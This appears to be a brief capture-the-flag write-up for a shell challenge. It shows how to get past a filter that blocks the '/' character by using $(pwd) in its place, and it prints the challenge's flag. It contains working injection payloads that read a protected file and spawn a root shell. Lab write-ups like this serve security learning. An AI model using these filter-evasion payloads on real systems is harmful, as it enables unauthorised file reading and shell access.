since we dont have any way to use the / we need to use a binary we now that output / 

this binary is pwd in the root directory but we cant just write $(pwd)bin$(pwd) (pwn will be executed)
so we need to put them in '' so it wont be trigerrd 
so the payload is  '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)*'
we could even open a shell as root with it  '$(pwd)bin$(pwd)sh'
remmber to run it from the root directory and not to use "" as it will run the pwd and will get cought by the filter



and we get the flag:FuN_w1th_5h3ll_v4riabl3s_haha
